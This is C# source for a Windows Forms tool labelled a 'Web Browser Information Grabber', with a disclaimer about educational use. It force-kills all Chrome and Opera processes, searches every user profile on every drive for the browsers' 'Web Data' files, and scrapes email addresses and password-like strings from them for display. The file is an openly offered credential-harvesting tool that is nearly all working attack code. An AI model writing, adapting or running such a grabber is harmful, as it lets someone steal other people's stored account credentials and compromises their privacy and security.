using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;

namespace NHA_Browser_Info_Passing
{
    public partial class BrowserInfPassing : Form{
        public BrowserInfPassing(){
            InitializeComponent();
        }


private void GetPasswordsFromChrome_Click(object sender, EventArgs e){
PrepAndDestroy();

}

void PrepAndDestroy(){
foreach (System.Diagnostics.Process chrome in System.Diagnostics.Process.GetProcessesByName("chrome")){
chrome.Kill();
}
foreach (System.Diagnostics.Process opera in System.Diagnostics.Process.GetProcessesByName("opera")){
opera.Kill();
}

for (; ; ){
if (System.Diagnostics.Process.GetProcessesByName("chrome").Length <= 1 && System.Diagnostics.Process.GetProcessesByName("opera").Length <= 1){
DoAccountFinding(); break;
}
}
}


string[] GetUserPaths(){
List<string> paths = new List<string>();
foreach (string drive in Directory.GetLogicalDrives()){
if (Directory.Exists(drive+"Users")){
string path = drive + "Users";
string[] UserFolders = Directory.GetDirectories(path);
foreach(string User in UserFolders){
string UserName= User.Split('\\')[User.Split('\\').Length - 1];
if (Directory.Exists(User+"\\AppData")&&Directory.Exists(User+"\\Start Menu")&& UserName != "Default"&& UserName!="Default User"){
paths.Add(User);
}}
}
}
return paths.ToArray();
}

void DoAccountFinding(){

List<string> CromeLocos=new List<string>();

foreach(string user in GetUserPaths()){
string temploco= user+@"\AppData\Local\Google\Chrome\User Data\Default";
string templocoopera= user+@"\AppData\Roaming\Opera Software\Opera Stable";
string templocooperaGX= user+ @"\AppData\Roaming\Opera Software\Opera GX Stable";
if (Directory.Exists(temploco) && File.Exists(temploco + "\\Web Data")){
CromeLocos.Add(temploco+"\\Web Data");
}
if(Directory.Exists(templocoopera) && File.Exists(templocoopera + "\\Web Data")){
CromeLocos.Add(templocoopera + "\\Web Data");
}
if(Directory.Exists(templocooperaGX) && File.Exists(templocooperaGX + "\\Web Data")){
CromeLocos.Add(templocooperaGX + "\\Web Data");
}
}

List<string> Emails=new List<string>();

List<string> Passwords=new List<string>();

foreach(string TooReed in CromeLocos) {
string Read=File.ReadAllText(TooReed);
                    
if(Read.Contains("{")){Read=Read.Replace("{","");}

if(Read.Contains("}")){Read=Read.Replace("}","");}


if(Read.Contains("emailconfirm")){
Read=Read.Replace("emailconfirm", ")");
}
if(Read.Contains("email-input")){
Read=Read.Replace("email-input", "(");
}
if(Read.Contains("email-addy")){
Read=Read.Replace("email-addy", ">");
}

if(Read.Contains("PasswordText")){

Read=Read.Replace("PasswordText","{");
string[] PassStore = Read.Split('{');
for(var i=1;i < PassStore.Length;i++){string Pass=PassStore[i];
string cleaned= Pass.Split(CharWhereToSplit(Pass))[0];
if(cleaned!=""&&cleaned.Length>1){
if(!Passwords.Contains(cleaned)){
Passwords.Add(cleaned);
}
}}

}


if(Read.Contains("email")){
Read=Read.Replace("email","}");
string[] MailStore = Read.Split('}');
for(var i=1;i < MailStore.Length;i++){string Mail= MailStore[i];
string cleaned= Mail.Split(CharWhereToSplitEmail(Mail))[0];
if(cleaned!=""&&cleaned.Length>1&&cleaned.Contains("@")){
char lastchar = cleaned.ToLower().Last();
if(lastchar!='o'&&lastchar!='m'&&lastchar!='k'){ 
cleaned = cleaned.TrimEnd(lastchar);
}
string meil=cleaned;
if(cleaned.Contains(".com")){
meil=cleaned.Replace(".com","~").Split('~')[0]+".com";
}else if(cleaned.Contains(".co")){
meil=cleaned.Replace(".co","~").Split('~')[0]+".co";
}else if(cleaned.Contains(".uk")){
meil=cleaned.Replace(".uk","~").Split('~')[0]+".uk";
}
if(!Emails.Contains(meil.ToLower())){
Emails.Add(meil.ToLower());
}

}}

}

}


List<string> AccountInfo = new List<string>();

AccountInfo.Add("");
AccountInfo.Add("Emails: ");

foreach(string info in Emails.ToArray()){
AccountInfo.Add(info);
}

AccountInfo.Add("");
AccountInfo.Add("Passwords: ");

foreach(string info in Passwords.ToArray()){
AccountInfo.Add(info);
}


InfoBox.Lines= AccountInfo.ToArray();
}



char CharWhereToSplit(string inputstring){ char rety = '~';
string lettice = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890";
for(var i=0;i<inputstring.Length;i++){
if(!lettice.Contains(inputstring[i])){
rety=inputstring[i];
break;
}
}

return rety;
}

char CharWhereToSplitEmail(string inputstring){ char rety = '~';
string lettice = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890@.-";
for(var i=0;i<inputstring.Length;i++){
if(!lettice.Contains(inputstring[i])){
rety=inputstring[i];
break;
}
}

return rety;
}


private void UserInfoPassing_Load(object sender, EventArgs e){
            List<string> TextS = new List<string>() {"",
                "{TESTING} Web Browser Infomation Grabber",
                "                 Grabber Version: 1.1",
                "               ~  Made By: dr NHA  ~",
                "   For Educational And Research Use Only!","","Disclaimer:",
                "               All Code Is Strictly Prohibited From Malware Use!",
                "Credits Have To Be Given To The Creator If Anything Is Used In Any Way!" };
    InfoBox.Lines= TextS.ToArray();
}


}
}
